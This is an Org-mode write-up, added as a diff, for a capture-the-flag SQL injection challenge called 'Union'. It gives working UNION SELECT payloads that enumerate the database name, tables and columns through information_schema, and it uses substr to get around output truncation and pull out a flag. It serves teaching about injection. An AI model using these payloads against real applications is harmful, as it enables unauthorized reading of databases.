@@ -1,0 +1,144 @@
+#+TITLE: Advent of CTF - Challenge 6
+#+SUBTITLE: "Union"
+
+* Challenge
+
+Yesterday was the first SQL Injection challenge, it is only logical to follow up with a more elaborate SQL Injection challenge, in this case a /UNION SELECT/ challenge.
+
+What you will learn:
+
+- How to identify a /UNION SELECT/
+- How to learn about other tables in a schema
+- How to use substring
+
+* Solution
+:PROPERTIES:
+:ATTACH_DIR: /home/arjen/stack/NOVI/AdventOfCTF/writeups/challenge-6/index_att
+:END:
+
+The challenge opens up to a search box.
+
+#+CAPTION: The SantaBase search
+[[file:index_att/search.png]]
+
+Entering any values will result in various lists to be returned. In the below screenshot de result is shown for the search of =a=.
+
+#+CAPTION: Search result for 'a'
+[[file:index_att/search-a.png]]
+
+The thing you will notice is that all fields are truncated. In the footer of the card it reads that due to privacy concerns the data is truncated to the first 5 characters.
+
+Obviously the entry that has a /FLAG/ written at the start of the line looks interesting, but it is a misdirect. It is meant to get you to figure out how to read the rest of the string.
+
+
+** Determine next steps
+
+In order to determine the steps it is important to figure out what is possible with the search. One of the first things to attempt is to use a /UNION SELECT/. This will make it possible to retrieve arbitrary data from the database. Lets try the most basic /UNION SELECT/.
+
+#+CAPTION: SQL for a UNION SELECT
+#+BEGIN_SRC sql
+' UNION SELECT 1,2,3 #
+#+END_SRC
+
+The result will be that a new row is added to the results with 1, 2 and 3 added in the columns. 
+
+#+CAPTION: UNION SELECT results
+[[file:index_att/union.png]]
+
+* Solve method 1 - The long way
+
+** Getting the database
+
+Great, so now we can start reading data from the database. As it probably is a MySQL/MariaDB server (as the last one was it), lets try reading the information schema. To speed that up, we need to know the database we are in. Lets try the /DATABASE()/ function first.
+
+#+CAPTION: SQL to access the database name
+#+BEGIN_SRC sql
+noextra' UNION SELECT 1,DATABASE(),3 #
+#+END_SRC
+
+I added =noextra= to the search to only get 1 row back.
+
+#+CAPTION: First part of the database name
+[[file:index_att/database.png]]
+
+The problem in this challenge is that only 5 characters are shown. How do we get the rest? One way to do it is to use the =substr= function. With =substr= it is possible to get a subset of a string, for instance character 6 through 10. Using it the rest of the string can be retrieved. In the following query the first part of the /DATABASE()/ function is in column 2, the 2nd part in column 3.
+
+#+CAPTION: SQL to retrieve the database name
+#+BEGIN_SRC sql
+noextra' UNION SELECT 1,DATABASE(),substr(DATABASE(),6,5) #
+#+END_SRC
+
+From the output it is clear that the name of the database is =testdb=.
+
+#+CAPTION: Retrieving the database name
+[[file:index_att/database-name.png]]
+
+** The information schema
+
+Using this strategy it is possible to read out the table names in the =testdb= schema. A reference of tables in the information schema can be read [[https://dev.mysql.com/doc/refman/5.7/en/information-schema.html][online]].
+
+#+CAPTION: SQL to retrieve the table names
+#+BEGIN_SRC sql
+noextra' UNION SELECT 1,table_name,substr(table_name,6,5)
+ FROM information_schema.tables
+ WHERE table_schema='testdb' #
+#+END_SRC
+
+The result shows 2 tables in the output. A table called =flags= and one called =secrets=.
+
+#+CAPTION: Output from the information schema
+[[file:index_att/tables.png]]
+
+Obviously the table called =flags= is the most interesting, as it will contain, well, flags hopefully. Using the previous strategy it is possible to get the column names as well.
+
+#+CAPTION: SQL to retrieve the column names
+#+BEGIN_SRC sql
+noextra' UNION SELECT 1,column_name,substr(column_name,6,5)
+  FROM information_schema.columns
+  WHERE table_name='flags' #
+#+END_SRC
+
+The only result from this query is =description=. So in the =testdb= schema there is a table called =flags= that has a column called =description=. Using this information a flag extractor can be created.
+
+** The flag
+
+#+CAPTION: SQL to retrieve the flag
+#+BEGIN_SRC sql
+noextra' UNION SELECT 1,description,substr(description,6,5) FROM flags #
+#+END_SRC
+
+The output reveals that the flag is more then 10 characters long, so multiple iterations will be needed to get to the full flag.
+
+#+CAPTION: Revealing the flag
+[[file:index_att/flag.png]]
+
+A follow up of this query would be to apply substring in both columns, each 5 characters further.
+
+#+CAPTION: SQL to retrieve the next part flag
+#+BEGIN_SRC sql
+noextra' UNION SELECT 1,substr(description,11,5),
+         substr(description,16,5) FROM flags #
+#+END_SRC
+
+With that the challenge is solved. Be sure to also check out the badge.
+
+#+CAPTION: The badge
+[[./index_att/badge.png]]
+
+* Solve method 2 - The short way
+
+If you were creative enough to not get trapped in /an id column can not contain text/ mindset you would've tried the following statement:
+
+#+CAPTION: DATABASE() in column 1
+#+BEGIN_SRC sql
+' UNION SELECT database(),2, 3
+#+END_SRC
+
+The thing you will notice is that the 1st column can be of unlimited size. Using this approach will lead to a SQL payload that is shown in the below listing.
+
+#+CAPTION: UNION SELECT on first column
+#+BEGIN_SRC sql
+' union select description,2,3 from flags #
+#+END_SRC
+
+Go back to the [[../../../index.org][homepage]].
